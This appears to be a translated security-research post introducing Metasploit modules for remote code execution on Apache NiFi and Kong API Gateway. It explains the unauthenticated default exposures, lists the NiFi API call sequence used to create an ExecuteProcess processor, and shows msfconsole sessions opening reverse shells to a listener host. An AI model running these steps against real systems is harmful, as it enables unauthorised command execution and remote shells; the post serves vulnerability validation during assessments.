# Apache NiFi 和 Kong API 网关中用于 RCE 的 Metasploit 模块

> 针对Metasploit框架的两个漏洞利用模块，旨在协助安全顾问在网络安全评估中遇到Kong API Gateway和Apache NiFi时验证漏洞的存在。

在发现Apache NiFi和Kong API Gateway中远程代码执行（RCE）漏洞的利用方法后，我们发现没有现成的工具能够轻松高效地验证存在漏洞的系统。F-Secure抓住机会为Metasploit框架开发了两个漏洞利用模块，旨在帮助安全顾问在进行安全评估时高效地验证这些漏洞。

据我们所知，此前尚未公开发布过关于这些攻击向量的研究。这两个模块已被Metasploit框架接受，并可在Metasploit 6.0.18版本中使用。模块的具体内容可以参考以下链接

- [Apache NiFi Processor RCE exploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/apache_nifi_processor_rce.rb)
- [Kong Gateway Admin API RCE exploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/kong_gateway_admin_api_rce.rb)

这些模块利用应用程序各自的HTTP(S) API，并需要管理员权限。然而，出于以下原因，管理员访问可能不需要身份验证：

- NiFi上的身份验证必须显式启用。默认安装通过HTTP服务，不需要身份验证，这意味着所有连接都具有管理员权限。在这种情况下，可以实现未经身份验证的远程代码执行。

- Kong管理员API通过HTTP和/或HTTPS服务，设计上不需要身份验证。最佳实践是将Kong管理员API仅暴露给本地主机，但是，在0.12.0之前的版本中，这不是默认设置，并且在2020年3月之前，docker-kong的compose文件中也不是默认设置，导致了CVE-2020-11710漏洞。如果管理员API没有绑定到本地主机，那么可以实现未经身份验证的远程代码执行。关于CVE-2020-11710的支持文章可以在这里找到。在撰写本文时（2021年1月9日），Shodan显示有1038个Kong管理员API实例暴露于互联网。

## NiFi漏洞利用模块

Apache NiFi 是一款用于自动化系统之间数据流的工具。它使用Java编写，允许用户通过Web UI或直接使用后端API配置“数据流”。它基于NSA开发的“NiagaraFiles”应用程序，于2014年开源。

可以从nifi.apache.org下载NiFi，该网站提供了可在Windows、Linux和MacOS上运行的源代码和编译后的Java二进制文件。此外，还提供了旧版本以及Docker镜像（可以在Docker Hub上找到）。

## 模块概述

这个漏洞利用模块利用了NiFi中标准处理器集合的一部分——ExecuteProcess处理器。根据设计，它允许执行操作系统命令。可以用来执行代码或操作系统命令的处理器被称为“受限组件”。从受限组件列表中选择ExecuteProcess的原因是：它相对易于使用，不依赖于任何已安装的脚本语言，并且没有标记为“实验性”。

在评估可利用性时，需要注意的是，如果启用了身份验证和授权，那么用于身份验证的账户必须具有以下权限才能使用该模块实现远程命令执行：

- **查看和修改根控制器权限：** 攻击者需要具备查看和修改NiFi根控制器的权限。

- **访问受限组件权限：** 攻击者需要具备“无视限制”访问受限组件的权限。

如果满足上述条件，模块中的`USERNAME`和`PASSWORD`选项可用于指定这些凭证。或者，如果需要更复杂的认证流程（如OpenId Connect），或者已经获取了会话令牌，则可以使用`TOKEN`选项设置JWT形式的会话令牌。目前不支持使用客户端证书进行身份验证。

漏洞利用模块会检查是否需要身份验证，并在需要时进行身份验证以获取访问令牌。然后，它会创建一个`ExecuteProcess`处理器并将其配置为运行操作系统命令。完成后，它将清理并删除该处理器。

所有与NiFi的交互都通过NiFi API进行，NiFi Web界面背后也使用了该API。模块按照以下顺序使用以下API：

- **GET /nifi-api/access/config:** 用于检查目标是否运行NiFi，以及是否需要身份验证。
- **POST /nifi-api/access/token:** 如果需要身份验证，则使用提供的凭证获取访问令牌。
- **GET /nifi-api/process-groups/root:** 获取根流程组的ID。 07a63126-0187-1000-fb61-e4f510a35ab6
- **POST /nifi-api/process-groups/<ROOT-PROCESSOR-GROUP-ID>/processors:** 在根组中创建一个ExecuteProcess处理器。 88dd84e1-0191-1000-0000-000010c1f312
- **PUT /nifi-api/processors/<NEW-PROCESSOR-ID>:** 配置新的ExecuteProcess处理器并运行操作系统命令。
- **PUT /nifi-api/processors/<NEW-PROCESSOR-ID>/run-status:** 在删除之前停止新的ExecuteProcess处理器。
- **DELETE /nifi-api/processors/<NEW-PROCESSOR-ID>/threads:** 如果停止失败，则终止线程。
- **DELETE /nifi-api/processors/<NEW-PROCESSOR-ID>:** 删除处理器

## 示例用法

在这个场景中，目标系统是Windows 10.0.18363 专业版，且未启用身份验证。

``` bash
$ msfconsole -q
msf5 exploit(multi/http/apache_nifi_processor_rce) > use multi/http/apache_nifi_processor_rce
[*] Using configured payload cmd/unix/reverse_bash
msf5 exploit(multi/http/apache_nifi_processor_rce) > set lhost 192.168.194.131
lhost => 192.168.194.131
msf5 exploit(multi/http/apache_nifi_processor_rce) > set target 1
target => 1
msf5 exploit(multi/http/apache_nifi_processor_rce) > set rhost 192.168.194.140
rhost => 192.168.194.140
msf5 exploit(multi/http/apache_nifi_processor_rce) > check
[*] 192.168.194.140:8080 - The target appears to be vulnerable.
msf5 exploit(multi/http/apache_nifi_processor_rce) > run -z
[*] Started reverse TCP handler on 192.168.194.131:4444
[*] Waiting 5 seconds before stopping and deleting
[*] Command shell session 1 opened (192.168.194.131:4444 -> 192.168.194.140:50008) at 2020-10-03 13:17:58 +0100
[*] Session 1 created in the background.
msf5 exploit(multi/http/apache_nifi_processor_rce) > sessions
 ​
Active sessions
===============
​
Id Name Type Information Connection
-- ---- ---- ----------- ----------
1 shell cmd/windows Microsoft Windows [Version 10.0.18363.1082] (c) 2019 Microsoft Corporation. A... 192.168.194.131:4444 -> 192.168.194.140:50008 (192.168.194.140)
```

**在以下场景中，目标是Ubuntu Linux Server 20.04.1，并且需要身份验证。** 这可以通过一条提示信息来确认，该信息明确表示需要进行身份验证。在提供身份验证凭证后，成功实现了漏洞利用。

```bash
$ msfconsole -q
msf5 exploit(multi/http/apache_nifi_processor_rce) > use multi/http/apache_nifi_processor_rce
[*] Using configured payload cmd/unix/reverse_bash
msf5 exploit(multi/http/apache_nifi_processor_rce) > set lhost 192.168.194.131
lhost => 192.168.194.131
msf5 exploit(multi/http/apache_nifi_processor_rce) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf5 exploit(multi/http/apache_nifi_processor_rce) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf5 exploit(multi/http/apache_nifi_processor_rce) > set rport 9443
rport => 9443
msf5 exploit(multi/http/apache_nifi_processor_rce) > check
[*] 127.0.0.1:9443 - The service is running, but could not be validated.
msf5 exploit(multi/http/apache_nifi_processor_rce) > run -z
[*] Started reverse TCP handler on 192.168.194.131:4444
[-] Exploit aborted due to failure: bad-config: Authentication is required. Bearer-Token or Username and Password must be specified
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/apache_nifi_processor_rce) > set username admin
username => admin
msf5 exploit(multi/http/apache_nifi_processor_rce) > set password admin
password => admin
msf5 exploit(multi/http/apache_nifi_processor_rce) > run -z
[*] Started reverse TCP handler on 192.168.194.131:4444
[*] Waiting 5 seconds before stopping and deleting
[*] Command shell session 1 opened (192.168.194.131:4444 -> 192.168.194.130:50802) at 2020-10-03 13:18:00 +0100
[*] Session 1 created in the background.
msf5 exploit(multi/http/apache_nifi_processor_rce) > sessions
​
Active sessions
===============
​
Id Name Type Information Connection
-- ---- ---- ----------- ----------
1 shell cmd/unix 192.168.194.131:4444 -> 192.168.194.130:50802 (127.0.0.1)
```

